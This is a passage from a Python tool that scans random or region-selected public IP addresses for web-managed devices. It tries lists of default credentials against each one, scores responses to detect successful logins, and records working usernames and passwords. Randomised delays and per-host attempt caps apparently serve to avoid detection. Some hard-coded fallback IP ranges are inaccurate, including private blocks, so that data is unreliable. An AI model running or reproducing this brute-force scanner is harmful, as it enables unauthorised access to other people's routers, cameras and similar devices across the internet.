            key = (entry[0], entry[1], entry[2])
            scored[key] = scored.get(key, 0) + 3
    for entry in FALLBACK_CREDS:
        scored.setdefault(entry, 1)
    ranked = sorted(scored.items(), key=lambda x: -x[1])
    return [e[0] for e in ranked[:max_creds]]


_auth_attempt_counts = {}
_auth_attempt_lock = threading.Lock()
MAX_AUTH_PER_IP = 12


SESSION_COOKIE_NAMES = [
    "session", "sid", "phpsessid", "token", "auth", "jwt",
    "connect.sid", "aspsessionid", "cftoken", "csrftoken",
]

HAS_PASSWORD_INPUT = re.compile(r'<input[^>]*type=["\']?password["\']?', re.I)
HAS_SESSION_COOKIE = re.compile(r'(session|sid|token|auth)[^=]*=', re.I)


def body_has_password_input(body):
    return bool(HAS_PASSWORD_INPUT.search(body or ""))


def response_has_session_cookie(r):
    for c in r.cookies:
        cname = c.name.lower()
        if any(x in cname for x in ("session", "sid", "token", "auth", "jwt")):
            return True
    set_cookie = (r.headers.get("Set-Cookie", "") or "").lower()
    return bool(HAS_SESSION_COOKIE.search(set_cookie))


def try_auth(ip, port, device_type="", use_https=False, unauth_body=""):
    global _auth_attempt_counts
    scheme = "https" if use_https else "http"
    found = []

    unauth_title = extract_title(unauth_body)
    unauth_forms = extract_form_fields(unauth_body)

    creds_to_try = get_relevant_creds(device_type)
    for user, pw, note in creds_to_try:
        with _auth_attempt_lock:
            if _auth_attempt_counts.get(ip, 0) >= MAX_AUTH_PER_IP:
                return found
        try:
            s = get_session()
            r = s.get(
                f"{scheme}://{ip}:{port}",
                auth=(user, pw),
                timeout=5,
                allow_redirects=False,
            )
            with _auth_attempt_lock:
                _auth_attempt_counts[ip] = _auth_attempt_counts.get(ip, 0) + 1

            if r.status_code == 401:
                time.sleep(random.uniform(0.3, 0.8))
                continue

            if r.status_code in (302, 301):
                dest = r.headers.get("Location", "").lower()
                login_paths = ("login", "auth", "signin", "logon", "authenticate")
                if not any(x in dest for x in login_paths):
                    found.append((user, pw, note, r.status_code))
                continue

            if r.status_code == 200:
                body = r.text or ""
                body_lower = body.lower()[:5000]

                # ─── Scoring: positive signals ───
                score = 0

                # Session cookie set → strong positive
                if response_has_session_cookie(r):
                    score += 40

                # Dashboard/admin content found → strong positive
                dash_count = has_dashboard_content_int(body_lower)
                score += dash_count * 8

                # Title changed meaningfully
                cur_title = extract_title(body)
                if cur_title and unauth_title:
                    t1, t2 = cur_title.lower(), unauth_title.lower()
                    if t1 != t2 and not any(x in t1 for x in ("login", "sign in", "signin", "authenticate", "password")):
                        score += 20

                # Form structure changed — fewer/no password fields
                auth_forms = extract_form_fields(body)
                if unauth_forms and auth_forms:
                    if unauth_forms["password_count"] > 0 and auth_forms["password_count"] == 0:
                        score += 30
                    if unauth_forms["input_count"] > auth_forms["input_count"] + 1:
                        score += 10  # More fields = dashboard vs login

                # Success phrases
                score += body_has_success_phrases(body) * 6

                # ─── Scoring: negative signals ───
                # Password input still present → very likely still on login
                if body_has_password_input(body):
                    score -= 40

                # Body too similar to unauthed → auth had no visible effect
                if unauth_body and len(body) > 200 and len(unauth_body) > 200:
                    ratio = SequenceMatcher(None, body[:3000], unauth_body[:3000]).ratio()
                    if ratio > 0.93:
                        score -= 50
                    elif ratio > 0.80:
                        score -= 20
                    elif ratio > 0.70:
                        score -= 8

                # Login form present without dashboard content
                if has_login_form(body_lower):
                    if not has_dashboard_content(body_lower):
                        score -= 30

                # Failure-specific phrases
                fail_count = count_failure_phrases(body)
                score -= fail_count * 8

                # Error banner/alert HTML classes
                if has_error_banner(body_lower):
                    score -= 20

                # ─── Decision ───
                if score >= 25:
                    found.append((user, pw, note, r.status_code))
        except Exception:
            time.sleep(random.uniform(0.3, 0.8))
            with _auth_attempt_lock:
                _auth_attempt_counts[ip] = _auth_attempt_counts.get(ip, 0) + 1
            pass
    return found


def scan_single(ip_str, no_auth_only=False, ports=None):
    if ports is None:
        ports = SCAN_PORTS
    results = []
    for port in ports:
        r = try_http(ip_str, port)
        if r is None:
            continue

        device = identify_device(r)
        url = r.url
        status = r.status_code
        is_https = url.startswith("https")

        no_auth = check_no_auth(r)

        if no_auth_only and not no_auth:
            continue

        auth_success = []
        if not no_auth:
            auth_success = try_auth(ip_str, port, device_type=device, use_https=is_https, unauth_body=r.text)

        result = {
            "ip": ip_str,
            "port": port,
            "url": url,
            "device": device,
            "no_auth": no_auth,
            "auth_found": bool(auth_success),
            "username": None,
            "password": None,
            "note": None,
            "status_code": status,
            "country": None,
            "country_code": None,
            "region": None,
            "city": None,
            "lat": None,
            "lon": None,
            "org": None,
            "isp": None,
            "as": None,
        }
        if auth_success:
            result["username"] = auth_success[0][0]
            result["password"] = auth_success[0][1]
            result["note"] = auth_success[0][2]
        results.append(result)
        if auth_success:
            break

    return results


live_hits = []
live_lock = threading.Lock()


def print_live_hit(result):
    tag = ""
    if result["auth_found"]:
        tag = " [CRED]"
    elif result["no_auth"]:
        tag = " [OPEN]"
    with live_lock:
        print(
            f"\r  [+] {result['url']:35s} | {result['device']:25s} | HTTP {result['status_code']}{tag}",
            file=sys.stderr,
        )


def worker(jobs, results, progress_list, lock, total, no_auth_only, ports, rate_limiter):
    session_cache.session = None
    while True:
        try:
            ip = jobs.get_nowait()
        except queue.Empty:
            break
        rate_limiter.acquire()
        time.sleep(random.uniform(0.15, 0.45))
        try:
            res = scan_single(ip, no_auth_only=no_auth_only, ports=ports)
            if res:
                for r in res:
                    print_live_hit(r)
                results.extend(res)
        except Exception:
            pass
        with lock:
            progress_list[0] += 1
            done = progress_list[0]
            if done % 200 == 0 or done == total:
                pct = done / total * 100
                print(f"\r  Progress: {done}/{total} ({pct:.1f}%) — hits: {len(results)}   ", end="", file=sys.stderr)
                if done == total:
                    print(file=sys.stderr)
        jobs.task_done()


def generate_ips(target, max_ips=50000):
    ips = []
    try:
        if "-" in target and "/" not in target:
            parts = target.split("-")
            start = ipaddress.IPv4Address(parts[0].strip())
            if "." in parts[1]:
                end = ipaddress.IPv4Address(parts[1].strip())
            else:
                base = list(start.packed)
                base[3] = int(parts[1].strip())
                end = ipaddress.IPv4Address(bytes(base))
            for i in range(int(start), int(end) + 1):
                ips.append(str(ipaddress.IPv4Address(i)))
                if len(ips) >= max_ips:
                    break
        elif "/" in target:
            network = ipaddress.IPv4Network(target, strict=False)
            count = min(network.num_addresses, max_ips)
            for i, addr in enumerate(network.hosts()):
                ips.append(str(addr))
                if i >= count - 2:
                    break
        else:
            ips.append(target)
    except Exception as e:
        print(f"  [!] Invalid target: {e}", file=sys.stderr)
        sys.exit(1)
    return ips


PRIVATE_RANGES = [
    ipaddress.IPv4Network("0.0.0.0/8"),
    ipaddress.IPv4Network("10.0.0.0/8"),
    ipaddress.IPv4Network("127.0.0.0/8"),
    ipaddress.IPv4Network("169.254.0.0/16"),
    ipaddress.IPv4Network("172.16.0.0/12"),
    ipaddress.IPv4Network("192.168.0.0/16"),
    ipaddress.IPv4Network("224.0.0.0/4"),
    ipaddress.IPv4Network("240.0.0.0/4"),
    ipaddress.IPv4Network("100.64.0.0/10"),
]


def is_public_ip(ip_str):
    addr = ipaddress.IPv4Address(ip_str)
    for net in PRIVATE_RANGES:
        if addr in net:
            return False
    return True


def generate_internet_ips(count, seed=None):
    if seed is not None:
        random.seed(seed)
    ips = []
    while len(ips) < count:
        ip_int = random.randint(0x01000000, 0xE0000000)
        ip_str = str(ipaddress.IPv4Address(ip_int))
        if is_public_ip(ip_str):
            ips.append(ip_str)
    return ips


RIR_CONFIG = {
    "afrinic": {
        "url": "https://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-extended-latest",
        "label": "AFRINIC (Africa)",
        "fallback_ranges": [
            (0x29000000, 0x29FFFFFF), (0x66000000, 0x66FFFFFF),
            (0x69000000, 0x69FFFFFF), (0xC4000000, 0xC4FFFFFF),
            (0xC5000000, 0xC5FFFFFF),
        ],
    },
    "ripe": {
        "url": "https://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-extended-latest",
        "label": "RIPE (Europe / Middle East)",
        "fallback_ranges": [
            (0x02000000, 0x02FFFFFF), (0x05000000, 0x05FFFFFF),
            (0x0A000000, 0x0AFFFFFF), (0x0E000000, 0x0EFFFFFF),
            (0x15000000, 0x15FFFFFF), (0x1A000000, 0x1AFFFFFF),
            (0x1B000000, 0x1BFFFFFF), (0x1C000000, 0x1CFFFFFF),
            (0x1D000000, 0x1DFFFFFF), (0x1E000000, 0x1EFFFFFF),
            (0x2A000000, 0x2AFFFFFF), (0x2B000000, 0x2BFFFFFF),
            (0x2C000000, 0x2CFFFFFF), (0x2D000000, 0x2DFFFFFF),
            (0x2E000000, 0x2EFFFFFF), (0x2F000000, 0x2FFFFFFF),
            (0x30000000, 0x30FFFFFF), (0x31000000, 0x31FFFFFF),
            (0x32000000, 0x32FFFFFF), (0x33000000, 0x33FFFFFF),
            (0x34000000, 0x34FFFFFF), (0x35000000, 0x35FFFFFF),
            (0x36000000, 0x36FFFFFF), (0x37000000, 0x37FFFFFF),
            (0x38000000, 0x38FFFFFF), (0x39000000, 0x39FFFFFF),
            (0x3A000000, 0x3AFFFFFF), (0x3B000000, 0x3BFFFFFF),
            (0x3C000000, 0x3CFFFFFF), (0x3D000000, 0x3DFFFFFF),
            (0x3E000000, 0x3EFFFFFF), (0x3F000000, 0x3FFFFFFF),
            (0x40000000, 0x40FFFFFF), (0x41000000, 0x41FFFFFF),
            (0x42000000, 0x42FFFFFF), (0x43000000, 0x43FFFFFF),
            (0x44000000, 0x44FFFFFF), (0x45000000, 0x45FFFFFF),
            (0x46000000, 0x46FFFFFF), (0x47000000, 0x47FFFFFF),
            (0x48000000, 0x48FFFFFF), (0x49000000, 0x49FFFFFF),
            (0x4A000000, 0x4AFFFFFF), (0x4B000000, 0x4BFFFFFF),
            (0x4C000000, 0x4CFFFFFF), (0x4D000000, 0x4DFFFFFF),
            (0x4E000000, 0x4EFFFFFF), (0x4F000000, 0x4FFFFFFF),
            (0x50000000, 0x50FFFFFF), (0x51000000, 0x51FFFFFF),
            (0x52000000, 0x52FFFFFF), (0x53000000, 0x53FFFFFF),
            (0x54000000, 0x54FFFFFF), (0x55000000, 0x55FFFFFF),
            (0x56000000, 0x56FFFFFF), (0x57000000, 0x57FFFFFF),
            (0x58000000, 0x58FFFFFF), (0x59000000, 0x59FFFFFF),
            (0x5A000000, 0x5AFFFFFF), (0x5B000000, 0x5BFFFFFF),
            (0x5C000000, 0x5CFFFFFF), (0x5D000000, 0x5DFFFFFF),
            (0x5E000000, 0x5EFFFFFF), (0x5F000000, 0x5FFFFFFF),
            (0x80000000, 0x80FFFFFF), (0x81000000, 0x81FFFFFF),
            (0x82000000, 0x82FFFFFF), (0x83000000, 0x83FFFFFF),
            (0x84000000, 0x84FFFFFF), (0x85000000, 0x85FFFFFF),
            (0x86000000, 0x86FFFFFF), (0x87000000, 0x87FFFFFF),
            (0x88000000, 0x88FFFFFF), (0x89000000, 0x89FFFFFF),
            (0x8A000000, 0x8AFFFFFF), (0x8B000000, 0x8BFFFFFF),
            (0x8C000000, 0x8CFFFFFF), (0x8D000000, 0x8DFFFFFF),
            (0x8E000000, 0x8EFFFFFF), (0x8F000000, 0x8FFFFFFF),
            (0x90000000, 0x90FFFFFF), (0x91000000, 0x91FFFFFF),
            (0x92000000, 0x92FFFFFF), (0x93000000, 0x93FFFFFF),
            (0x94000000, 0x94FFFFFF), (0x95000000, 0x95FFFFFF),
            (0x96000000, 0x96FFFFFF), (0x97000000, 0x97FFFFFF),
            (0x98000000, 0x98FFFFFF), (0x99000000, 0x99FFFFFF),
            (0x9A000000, 0x9AFFFFFF), (0x9B000000, 0x9BFFFFFF),
            (0x9C000000, 0x9CFFFFFF), (0x9D000000, 0x9DFFFFFF),
            (0x9E000000, 0x9EFFFFFF), (0x9F000000, 0x9FFFFFFF),
            (0xA0000000, 0xA0FFFFFF), (0xA1000000, 0xA1FFFFFF),
            (0xA2000000, 0xA2FFFFFF), (0xA3000000, 0xA3FFFFFF),
            (0xA4000000, 0xA4FFFFFF), (0xA5000000, 0xA5FFFFFF),
            (0xA6000000, 0xA6FFFFFF), (0xA7000000, 0xA7FFFFFF),
            (0xA8000000, 0xA8FFFFFF), (0xA9000000, 0xA9FFFFFF),
            (0xAA000000, 0xAAFFFFFF), (0xAB000000, 0xABFFFFFF),
            (0xAC000000, 0xACFFFFFF), (0xAD000000, 0xADFFFFFF),
            (0xAE000000, 0xAEFFFFFF), (0xAF000000, 0xAFFFFFFF),
            (0xB0000000, 0xB0FFFFFF), (0xB1000000, 0xB1FFFFFF),
            (0xB2000000, 0xB2FFFFFF), (0xB3000000, 0xB3FFFFFF),
            (0xB4000000, 0xB4FFFFFF), (0xB5000000, 0xB5FFFFFF),
            (0xB6000000, 0xB6FFFFFF), (0xB7000000, 0xB7FFFFFF),
            (0xB8000000, 0xB8FFFFFF), (0xB9000000, 0xB9FFFFFF),
            (0xBA000000, 0xBAFFFFFF), (0xBB000000, 0xBBFFFFFF),
            (0xBC000000, 0xBCFFFFFF), (0xBD000000, 0xBDFFFFFF),
            (0xBE000000, 0xBEFFFFFF), (0xBF000000, 0xBFFFFFFF),
            (0xC0000000, 0xC0FFFFFF), (0xC1000000, 0xC1FFFFFF),
            (0xC2000000, 0xC2FFFFFF),
        ],
    },
    "arin": {
        "url": "https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest",
        "label": "ARIN (North America)",
        "fallback_ranges": [
            (0x00000000, 0x01FFFFFF), (0x03000000, 0x04FFFFFF),
            (0x06000000, 0x09FFFFFF), (0x0B000000, 0x0DFFFFFF),
            (0x0F000000, 0x14FFFFFF), (0x16000000, 0x19FFFFFF),
            (0x1F000000, 0x29FFFFFF), (0x60000000, 0x65FFFFFF),
            (0x67000000, 0x6EFFFFFF), (0x70000000, 0x7FFFFFFF),
            (0xA9000000, 0xA9FFFFFF), (0xAC100000, 0xAC1FFFFF),
            (0xC0A80000, 0xC0A8FFFF),
        ],
    },
    "apnic": {
        "url": "https://ftp.apnic.net/pub/stats/apnic/delegated-apnic-extended-latest",
        "label": "APNIC (Asia Pacific)",
        "fallback_ranges": [
            (0x01000000, 0x01FFFFFF), (0x03000000, 0x03FFFFFF),
            (0x06000000, 0x06FFFFFF), (0x0B000000, 0x0BFFFFFF),
            (0x0C000000, 0x0CFFFFFF), (0x0D000000, 0x0DFFFFFF),
            (0x0F000000, 0x0FFFFFFF), (0x10000000, 0x10FFFFFF),
            (0x11000000, 0x11FFFFFF), (0x12000000, 0x12FFFFFF),
            (0x13000000, 0x13FFFFFF), (0x14000000, 0x14FFFFFF),
            (0x15000000, 0x15FFFFFF), (0x16000000, 0x16FFFFFF),
            (0x17000000, 0x17FFFFFF), (0x18000000, 0x18FFFFFF),
            (0x19000000, 0x19FFFFFF), (0x1A000000, 0x1AFFFFFF),
            (0x1B000000, 0x1BFFFFFF), (0x1C000000, 0x1CFFFFFF),
            (0x1D000000, 0x1DFFFFFF), (0x1E000000, 0x1EFFFFFF),
            (0x20000000, 0x20FFFFFF), (0x21000000, 0x21FFFFFF),
            (0x22000000, 0x22FFFFFF), (0x23000000, 0x23FFFFFF),
            (0x24000000, 0x24FFFFFF), (0x25000000, 0x25FFFFFF),
            (0x26000000, 0x26FFFFFF), (0x27000000, 0x27FFFFFF),
            (0x28000000, 0x28FFFFFF), (0x2A000000, 0x2AFFFFFF),
            (0x2B000000, 0x2BFFFFFF), (0x2C000000, 0x2CFFFFFF),
            (0x2D000000, 0x2DFFFFFF), (0x2E000000, 0x2EFFFFFF),
            (0x2F000000, 0x2FFFFFFF), (0x3A000000, 0x3AFFFFFF),
            (0x3B000000, 0x3BFFFFFF), (0x3C000000, 0x3CFFFFFF),
            (0x3D000000, 0x3DFFFFFF), (0x3E000000, 0x3EFFFFFF),
            (0x3F000000, 0x3FFFFFFF), (0x40000000, 0x40FFFFFF),
            (0x41000000, 0x41FFFFFF), (0x42000000, 0x42FFFFFF),
            (0x43000000, 0x43FFFFFF), (0x44000000, 0x44FFFFFF),
            (0x45000000, 0x45FFFFFF), (0x46000000, 0x46FFFFFF),
            (0x47000000, 0x47FFFFFF), (0x48000000, 0x48FFFFFF),
            (0x49000000, 0x49FFFFFF), (0x4A000000, 0x4AFFFFFF),
            (0x4B000000, 0x4BFFFFFF), (0x4C000000, 0x4CFFFFFF),
            (0x4D000000, 0x4DFFFFFF), (0x4E000000, 0x4EFFFFFF),
            (0x4F000000, 0x4FFFFFFF), (0x50000000, 0x50FFFFFF),
            (0x51000000, 0x51FFFFFF), (0x52000000, 0x52FFFFFF),
            (0x53000000, 0x53FFFFFF), (0x54000000, 0x54FFFFFF),
            (0x55000000, 0x55FFFFFF), (0x56000000, 0x56FFFFFF),
            (0x57000000, 0x57FFFFFF), (0x58000000, 0x58FFFFFF),
            (0x59000000, 0x59FFFFFF), (0x5A000000, 0x5AFFFFFF),
            (0x5B000000, 0x5BFFFFFF), (0x5C000000, 0x5CFFFFFF),
            (0x5D000000, 0x5DFFFFFF), (0x5E000000, 0x5EFFFFFF),
            (0x5F000000, 0x5FFFFFFF), (0x60000000, 0x60FFFFFF),
            (0x61000000, 0x61FFFFFF), (0x62000000, 0x62FFFFFF),
            (0x63000000, 0x63FFFFFF), (0x64000000, 0x64FFFFFF),
            (0x65000000, 0x65FFFFFF), (0x66000000, 0x66FFFFFF),
            (0x67000000, 0x67FFFFFF), (0x68000000, 0x68FFFFFF),
            (0x69000000, 0x69FFFFFF), (0x6A000000, 0x6AFFFFFF),
            (0x6B000000, 0x6BFFFFFF), (0x6C000000, 0x6CFFFFFF),
            (0x6D000000, 0x6DFFFFFF), (0x6E000000, 0x6EFFFFFF),
            (0x6F000000, 0x6FFFFFFF), (0x70000000, 0x70FFFFFF),
            (0x71000000, 0x71FFFFFF), (0x72000000, 0x72FFFFFF),
            (0x73000000, 0x73FFFFFF), (0x74000000, 0x74FFFFFF),
            (0x75000000, 0x75FFFFFF), (0x76000000, 0x76FFFFFF),
            (0x77000000, 0x77FFFFFF), (0x78000000, 0x78FFFFFF),
            (0x79000000, 0x79FFFFFF), (0x7A000000, 0x7AFFFFFF),
            (0x7B000000, 0x7BFFFFFF), (0x7C000000, 0x7CFFFFFF),
            (0x7D000000, 0x7DFFFFFF), (0x7E000000, 0x7EFFFFFF),
            (0xC6000000, 0xC6FFFFFF), (0xC7000000, 0xC7FFFFFF),
            (0xC8000000, 0xC8FFFFFF), (0xC9000000, 0xC9FFFFFF),
            (0xCA000000, 0xCAFFFFFF), (0xCB000000, 0xCBFFFFFF),
            (0xCC000000, 0xCCFFFFFF), (0xCD000000, 0xCDFFFFFF),
            (0xCE000000, 0xCEFFFFFF), (0xCF000000, 0xCFFFFFFF),
            (0xD0000000, 0xD0FFFFFF), (0xD1000000, 0xD1FFFFFF),
            (0xD2000000, 0xD2FFFFFF), (0xD3000000, 0xD3FFFFFF),
            (0xD4000000, 0xD4FFFFFF), (0xD5000000, 0xD5FFFFFF),
            (0xD6000000, 0xD6FFFFFF), (0xD7000000, 0xD7FFFFFF),
            (0xD8000000, 0xD8FFFFFF), (0xD9000000, 0xD9FFFFFF),
            (0xDA000000, 0xDAFFFFFF), (0xDB000000, 0xDBFFFFFF),
            (0xDC000000, 0xDCFFFFFF), (0xDD000000, 0xDDFFFFFF),
            (0xDE000000, 0xDEFFFFFF), (0xDF000000, 0xDFFFFFFF),
            (0xE0000000, 0xE0FFFFFF),
        ],
    },
    "lacnic": {
        "url": "https://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest",
        "label": "LACNIC (Latin America)",
        "fallback_ranges": [
            (0x02000000, 0x02FFFFFF), (0x05000000, 0x05FFFFFF),
            (0x0A000000, 0x0AFFFFFF), (0x0E000000, 0x0EFFFFFF),
            (0x12000000, 0x12FFFFFF), (0x13000000, 0x13FFFFFF),
            (0x14000000, 0x14FFFFFF), (0x15000000, 0x15FFFFFF),
            (0x16000000, 0x16FFFFFF), (0x17000000, 0x17FFFFFF),
            (0x18000000, 0x18FFFFFF), (0x19000000, 0x19FFFFFF),
            (0x1A000000, 0x1AFFFFFF), (0x1B000000, 0x1BFFFFFF),
            (0x1C000000, 0x1CFFFFFF), (0x1D000000, 0x1DFFFFFF),
            (0x1E000000, 0x1EFFFFFF), (0x1F000000, 0x1FFFFFFF),
            (0x20000000, 0x20FFFFFF), (0x3A000000, 0x3AFFFFFF),
            (0x3B000000, 0x3BFFFFFF), (0x3C000000, 0x3CFFFFFF),
            (0x3D000000, 0x3DFFFFFF), (0x3E000000, 0x3EFFFFFF),
            (0x3F000000, 0x3FFFFFFF), (0x40000000, 0x40FFFFFF),
            (0x41000000, 0x41FFFFFF), (0x42000000, 0x42FFFFFF),
            (0x43000000, 0x43FFFFFF), (0x44000000, 0x44FFFFFF),
            (0x45000000, 0x45FFFFFF), (0x46000000, 0x46FFFFFF),
            (0x47000000, 0x47FFFFFF), (0x48000000, 0x48FFFFFF),
            (0x49000000, 0x49FFFFFF), (0x4A000000, 0x4AFFFFFF),
            (0x4B000000, 0x4BFFFFFF), (0x4C000000, 0x4CFFFFFF),
            (0x4D000000, 0x4DFFFFFF), (0x4E000000, 0x4EFFFFFF),
            (0x4F000000, 0x4FFFFFFF), (0x50000000, 0x50FFFFFF),
            (0x51000000, 0x51FFFFFF), (0x52000000, 0x52FFFFFF),
            (0x53000000, 0x53FFFFFF), (0x54000000, 0x54FFFFFF),
            (0x55000000, 0x55FFFFFF), (0x56000000, 0x56FFFFFF),
            (0x57000000, 0x57FFFFFF), (0x58000000, 0x58FFFFFF),
            (0x59000000, 0x59FFFFFF), (0x5A000000, 0x5AFFFFFF),
            (0x5B000000, 0x5BFFFFFF), (0x5C000000, 0x5CFFFFFF),
            (0x5D000000, 0x5DFFFFFF), (0x5E000000, 0x5EFFFFFF),
            (0x5F000000, 0x5FFFFFFF), (0x80000000, 0x80FFFFFF),
            (0x81000000, 0x81FFFFFF), (0x82000000, 0x82FFFFFF),
            (0x83000000, 0x83FFFFFF), (0x84000000, 0x84FFFFFF),
            (0x85000000, 0x85FFFFFF), (0x86000000, 0x86FFFFFF),
            (0x87000000, 0x87FFFFFF), (0x88000000, 0x88FFFFFF),
            (0x89000000, 0x89FFFFFF), (0x8A000000, 0x8AFFFFFF),
            (0x8B000000, 0x8BFFFFFF), (0x8C000000, 0x8CFFFFFF),
            (0x8D000000, 0x8DFFFFFF), (0x8E000000, 0x8EFFFFFF),
            (0x8F000000, 0x8FFFFFFF), (0x90000000, 0x90FFFFFF),
            (0x91000000, 0x91FFFFFF), (0x92000000, 0x92FFFFFF),
            (0x93000000, 0x93FFFFFF), (0x94000000, 0x94FFFFFF),
            (0x95000000, 0x95FFFFFF), (0x96000000, 0x96FFFFFF),
            (0x97000000, 0x97FFFFFF), (0x98000000, 0x98FFFFFF),
            (0x99000000, 0x99FFFFFF), (0x9A000000, 0x9AFFFFFF),
            (0x9B000000, 0x9BFFFFFF), (0x9C000000, 0x9CFFFFFF),
            (0x9D000000, 0x9DFFFFFF), (0x9E000000, 0x9EFFFFFF),
            (0x9F000000, 0x9FFFFFFF), (0xA0000000, 0xA0FFFFFF),
            (0xA1000000, 0xA1FFFFFF), (0xA2000000, 0xA2FFFFFF),
            (0xA3000000, 0xA3FFFFFF), (0xA4000000, 0xA4FFFFFF),
            (0xA5000000, 0xA5FFFFFF), (0xA6000000, 0xA6FFFFFF),
            (0xA7000000, 0xA7FFFFFF), (0xA8000000, 0xA8FFFFFF),
        ],
    },
}

REGION_CONFIG = {
    "europe": {"rirs": ["ripe"], "label": "Europe", "fallback": "ripe"},
    "north-america": {"rirs": ["arin"], "label": "North America", "fallback": "arin"},
    "asia": {"rirs": ["apnic"], "label": "Asia Pacific", "fallback": "apnic"},
    "latin-america": {"rirs": ["lacnic"], "label": "Latin America", "fallback": "lacnic"},
    "africa": {"rirs": ["afrinic"], "label": "Africa", "fallback": "afrinic"},
    "subsaharan": {"rirs": ["afrinic"], "label": "Sub-Saharan Africa", "fallback": "afrinic"},
    "worldwide": {"rirs": ["afrinic", "ripe", "arin", "apnic", "lacnic"], "label": "Worldwide", "fallback": None},
    "europe-africa": {"rirs": ["ripe", "afrinic"], "label": "Europe + Africa", "fallback": None},
    "americas": {"rirs": ["arin", "lacnic"], "label": "Americas", "fallback": None},
    "india": {"rirs": ["apnic"], "label": "India", "fallback": "apnic", "countries": ["IN"]},
    "middle-east": {"rirs": ["ripe"], "label": "Middle East", "fallback": "ripe", "countries": ["SA", "AE", "QA", "OM", "KW", "BH", "IR", "IQ", "IL", "JO", "LB", "YE", "SY"]},
    "oceania": {"rirs": ["apnic"], "label": "Oceania", "fallback": "apnic", "countries": ["AU", "NZ", "FJ", "PG", "SB", "VU", "NC", "PF"]},
    "southeast-asia": {"rirs": ["apnic"], "label": "Southeast Asia", "fallback": "apnic", "countries": ["SG", "MY", "ID", "TH", "VN", "PH", "MM", "KH", "LA", "BN", "TL"]},
    "east-asia": {"rirs": ["apnic"], "label": "East Asia", "fallback": "apnic", "countries": ["JP", "KR", "CN", "TW", "HK", "MO"]},
    "central-asia": {"rirs": ["ripe"], "label": "Central Asia", "fallback": "ripe", "countries": ["KZ", "UZ", "TM", "KG", "TJ", "MN"]},
    "nordics": {"rirs": ["ripe"], "label": "Nordics", "fallback": "ripe", "countries": ["SE", "NO", "DK", "FI", "IS"]},
    "eastern-europe": {"rirs": ["ripe"], "label": "Eastern Europe", "fallback": "ripe", "countries": ["PL", "CZ", "HU", "RO", "BG", "SK", "SI", "HR", "RS", "BA", "AL", "MK", "ME", "LT", "LV", "EE", "MD", "UA", "BY"]},
    "south-america": {"rirs": ["lacnic"], "label": "South America", "fallback": "lacnic", "countries": ["BR", "AR", "CL", "CO", "PE", "EC", "BO", "UY", "PY", "VE", "GY", "SR"]},
}

SSA_EXCLUDED_COUNTRIES = {"EG", "MA", "DZ", "TN", "LY", "SD"}

_rir_cache_dir = None


def _get_rir_cache_dir():
    global _rir_cache_dir
    if _rir_cache_dir is None:
        d = os.path.join(tempfile.gettempdir(), "devicescanner_cache")
        os.makedirs(d, exist_ok=True)
        _rir_cache_dir = d
    return _rir_cache_dir


def download_rir_delegated(rir_name, force=False):
    config = RIR_CONFIG.get(rir_name)
    if not config:
        return None
    url = config["url"]
    path = os.path.join(_get_rir_cache_dir(), f"delegated-{rir_name}-extended-latest.txt")
    if not force and os.path.exists(path):
        age = time.time() - os.path.getmtime(path)
        if age < 86400:
            return path
    try:
        print(f"  [*] Downloading {config['label']} IP allocation data...", file=sys.stderr)
        r = requests.get(url, timeout=30)
        r.raise_for_status()
        with open(path, "w", encoding="utf-8") as f:
            f.write(r.text)
        print(f"  [*] Downloaded {config['label']} ({len(r.text):,} bytes)", file=sys.stderr)
    except Exception as e:
        print(f"  [!] Failed to download {config['label']} data: {e}", file=sys.stderr)
        if os.path.exists(path):
            print("  [*] Using cached version", file=sys.stderr)
            return path
        return None
    return path


def parse_rir_ranges(filepath, include_countries=None, exclude_countries=None):
    ranges = []
    seen = set()
    try:
        with open(filepath, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or line.startswith("2"):
                    continue
                parts = line.split("|")
                if len(parts) >= 7 and parts[2] == "ipv4" and parts[6] in ("allocated", "assigned"):
                    country = parts[1]
                    if include_countries is not None and country not in include_countries:
                        continue
                    if exclude_countries is not None and country in exclude_countries:
                        continue
                    start_int = int(ipaddress.IPv4Address(parts[3]))
                    count = int(parts[4])
                    key = (start_int, count)
                    if key in seen:
                        continue
                    seen.add(key)
                    ranges.append((start_int, count))
    except Exception as e:
        print(f"  [!] Error parsing RIR data: {e}", file=sys.stderr)
        return []
    return ranges


def generate_ips_from_ranges(count, ranges):
    if not ranges:
        return []
    total = sum(c for _, c in ranges)
    prefix = []
    acc = 0
    for _, c in ranges:
        acc += c
        prefix.append(acc)
    ips = []
    attempts = 0
    max_attempts = count * 3
    while len(ips) < count and attempts < max_attempts:
        attempts += 1
        r = random.randint(0, total - 1)
        idx = bisect.bisect_right(prefix, r)
        offset = r - (prefix[idx - 1] if idx > 0 else 0)
        start_int, _ = ranges[idx]
        ip_str = str(ipaddress.IPv4Address(start_int + offset))
        if is_public_ip(ip_str):
            ips.append(ip_str)
    return ips


def prefetch_rir_data(rir_names):
    """Download all needed RIR files in parallel."""
    needed = []
    for name in rir_names:
        config = RIR_CONFIG.get(name)
        if not config:
            continue
        path = os.path.join(_get_rir_cache_dir(), f"delegated-{name}-extended-latest.txt")
        if os.path.exists(path):
            age = time.time() - os.path.getmtime(path)
            if age < 86400:
                continue
        needed.append(name)
    if not needed:
        return
    with ThreadPoolExecutor(max_workers=len(needed)) as ex:
        list(ex.map(lambda n: download_rir_delegated(n, force=True), needed))


def generate_rir_ips(rir_name, count, include_countries=None, exclude_countries=None):
    config = RIR_CONFIG.get(rir_name)
    if not config:
        return []
    filepath = download_rir_delegated(rir_name)
    if filepath is None:
        print(f"  [!] Cannot download {config['label']} data, falling back to random /8 scanning", file=sys.stderr)
        return _generate_rir_fallback(rir_name, count)
    ranges = parse_rir_ranges(filepath, include_countries=include_countries, exclude_countries=exclude_countries)
    if not ranges:
        print(f"  [!] No allocated ranges found for {config['label']}, falling back to random /8 scanning", file=sys.stderr)
        return _generate_rir_fallback(rir_name, count)
    total_allocated = sum(c for _, c in ranges)
    label = config["label"]
    extra = ""
    if include_countries:
        extra = f" ({','.join(sorted(include_countries))})"
    elif exclude_countries:
        extra = " (SSA)"
    print(f"  [*] {label}{extra}: {len(ranges):,} ranges ({total_allocated:,} IPs)", file=sys.stderr)
    return generate_ips_from_ranges(count, ranges)


def _generate_rir_fallback(rir_name, count):
    config = RIR_CONFIG.get(rir_name)
    blocks = config.get("fallback_ranges", []) if config else []
